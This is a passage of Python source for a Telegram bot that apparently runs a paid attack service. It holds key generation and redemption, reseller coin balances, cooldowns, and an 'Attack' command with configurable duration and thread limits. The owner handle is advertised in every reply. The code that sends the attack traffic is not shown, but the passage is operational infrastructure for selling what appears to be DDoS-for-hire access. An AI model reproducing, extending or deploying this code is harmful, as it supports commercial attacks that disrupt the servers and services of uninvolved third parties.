                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text(
                "❌ Reseller not found!\n\n"
                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            await update.message.reply_text(
                "✅ Added {} coins to reseller {}. New balance: {}*\n\n"
                "👑 Owner: @Riyahacksyt".format(amount, user_id, reseller_balances[user_id]),
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ Reseller not found!\n\n"
                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid amount! Please enter a number.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    return ConversationHandler.END

async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text(
            "❌ Only resellers can check their balance!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    await update.message.reply_text(
        "💰 Your current balance is: {} coins\n\n"
        "👑 Owner: @Riyahacksyt\n"
        "💳 DM to recharge balance: @Riyahacksyt".format(balance),
        parse_mode='Markdown'
    )

async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        await update.message.reply_text(
            "✅ Thanks for your feedback!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )

async def check_key_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text(
            "❌ This command can only be used in the allowed group!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    current_time = time.time()

    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
            expiration_time = redeemed_users[user_id]['expiration_time']
            remaining_time = expiration_time - current_time
            
            if remaining_time > 0:
                days = int(remaining_time // 86400)
                hours = int((remaining_time % 86400) // 3600)
                
                key_info = None
                for key, info in redeemed_keys_info.items():
                    if info['redeemed_by'] == user_id and info.get('is_special'):
                        key_info = key
                        break
                
                status_message = (
                    "🔍 Special Key Status\n\n"
                    "👤 User: {}\n"
                    "🆔 ID: `{}`\n"
                    "🔑 Key: `{}`\n"
                    "⏳ Status: 🟢 Running\n"
                    "🕒 Remaining Time: {}d {}h\n"
                    "⚡ Max Duration: {} sec\n"
                    "🧵 Max Threads: {}\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n\n"
                    "💎 Enjoy your premium special access!".format(
                        escape_markdown(user_name, version=2),
                        user_id,
                        escape_markdown(key_info, version=2) if key_info else 'Unknown',
                        days,
                        hours,
                        SPECIAL_MAX_DURATION,
                        SPECIAL_MAX_THREADS
                    )
                )
            else:
                status_message = (
                    "🔍 Special Key Status\n\n"
                    "👤 User: {}\n"
                    "🆔 ID: `{}`\n"
                    "🔑 Key: `{}`\n"
                    "⏳ Status: 🔴 Expired\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n"
                    "🔑 DM for new special keys: @Riyahacksyt\n\n"
                    "❌ Your special key has expired.".format(
                        escape_markdown(user_name, version=2),
                        user_id,
                        escape_markdown(key_info, version=2) if key_info else 'Unknown'
                    )
                )
        else:
            expiration_time = redeemed_users[user_id]
            remaining_time = expiration_time - current_time
            
            if remaining_time > 0:
                hours = int(remaining_time // 3600)
                minutes = int((remaining_time % 3600) // 60)
                
                key_info = None
                for key, info in redeemed_keys_info.items():
                    if info['redeemed_by'] == user_id:
                        key_info = key
                        break
                
                status_message = (
                    "🔍 Key Status\n\n"
                    "👤 User: {}\n"
                    "🆔 ID: `{}`\n"
                    "🔑 Key: `{}`\n"
                    "⏳ Status: 🟢 Running\n"
                    "🕒 Remaining Time: {}h {}m\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n\n"
                    "⚡ Your key is active!".format(
                        escape_markdown(user_name, version=2),
                        user_id,
                        escape_markdown(key_info, version=2) if key_info else 'Unknown',
                        hours,
                        minutes
                    )
                )
            else:
                status_message = (
                    "🔍 Key Status\n\n"
                    "👤 User: {}\n"
                    "🆔 ID: `{}`\n"
                    "🔑 Key: `{}`\n"
                    "⏳ Status: 🔴 Expired\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n"
                    "🔑 DM for new keys: @Riyahacksyt\n\n"
                    "❌ Your key has expired.".format(
                        escape_markdown(user_name, version=2),
                        user_id,
                        escape_markdown(key_info, version=2) if key_info else 'Unknown'
                    )
                )
    else:
        status_message = (
            "🔍 Key Status\n\n"
            "👤 User: {}\n"
            "🆔 ID: `{}`\n\n"
            "❌ No active key found!\n\n"
            "👑 Bot Owner: @Riyahacksyt\n"
            "🔑 DM to purchase keys: @Riyahacksyt\n\n"
            "ℹ️ You need a key to use the bot.".format(
                escape_markdown(user_name, version=2),
                user_id
            )
        )

    await update.message.reply_text(status_message, parse_mode='Markdown')

async def cancel_conversation(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "❌ Current process canceled.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def rules(update: Update, context: CallbackContext):
    rules_text = (
        "📜 Rules:\n\n"
        "1. Do not spam the bot\n"
        "2. Only use in allowed group\n"
        "3. Do not share your keys\n"
        "4. Follow instructions carefully\n"
        "5. Respect other users\n"
        "6. Violations = ban with no refund\n\n"
        "👑 Bot Owner: @Riyahacksyt\n"
        "🔑 DM for keys: @Riyahacksyt\n\n"
        "Please follow the rules to avoid being banned."
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

async def handle_button_click(update: Update, context: CallbackContext):
    chat = update.effective_chat
    query = update.message.text

    if chat.type == "private" and not is_authorized_user(update):
        image = get_random_start_image()
        await update.message.reply_photo(
            photo=image['url'],
            caption=(
                "❌ This bot is not authorized to use here.\n\n"
                "👑 Owner: @Riyahacksyt\n"
                "🔑 DM for keys: @Riyahacksyt"
            ),
            parse_mode='Markdown'
        )
        return

    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Generate Key':
        await generate_key_start(update, context)
    elif query == 'Redeem Key':
        await redeem_key_start(update, context)
    elif query == 'Keys':
        await show_keys(update, context)
    elif query == 'Delete Key':
        await delete_key_start(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)
    elif query == '🔍 Status':
        await check_key_status(update, context)
    elif query == 'OpenBot':
        await open_bot(update, context)
    elif query == 'CloseBot':
        await close_bot(update, context)
    elif query == '🔑 Special Key':
        await generate_special_key_start(update, context)
    elif query == 'RE MENU':
        if is_owner(update):
            await update.message.reply_text(
                "🔧 Owner Management Menu",
                parse_mode='Markdown',
                reply_markup=re_menu_markup
            )
    elif query == 'Back to Main':
        if is_owner(update):
            await update.message.reply_text(
                "👑 Owner Menu",
                parse_mode='Markdown',
                reply_markup=owner_markup
            )

async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = []
    
    for user_id, key_info in redeemed_users.items():
        if isinstance(key_info, dict):
            if key_info['expiration_time'] <= current_time:
                expired_users.append(user_id)
        elif isinstance(key_info, (int, float)) and key_info <= current_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]

        expired_keys = [key for key, info in redeemed_keys_info.items() if info['redeemed_by'] == user_id]
        for key in expired_keys:
            del redeemed_keys_info[key]

    save_keys()
    logging.info("Expired users and keys removed: {}".format(expired_users))

def main():
    load_keys()

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.job_queue.run_repeating(check_expired_keys, interval=60, first=0)

    generate_key_handler = ConversationHandler(
        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.TEXT & filters.Regex('^Generate Key$'), generate_key_start)],
        states={
            GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.TEXT & filters.Regex('^Redeem Key$'), redeem_key_start)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.TEXT & filters.Regex('^Attack$'), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.TEXT & filters.Regex('^Set Duration$'), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("setthreads", set_threads_start), MessageHandler(filters.TEXT & filters.Regex('^Set Threads$'), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    delete_key_handler = ConversationHandler(
        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.TEXT & filters.Regex('^Delete Key$'), delete_key_start)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.TEXT & filters.Regex('^Add Reseller$'), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.TEXT & filters.Regex('^Remove Reseller$'), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.TEXT & filters.Regex('^Add Coin$'), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.TEXT & filters.Regex('^Set Cooldown$'), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    special_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.TEXT & filters.Regex('^🔑 Special Key$'), generate_special_key_start)],
        states={
            GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_duration)],
            GET_SPECIAL_KEY_FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_format)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(special_key_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()
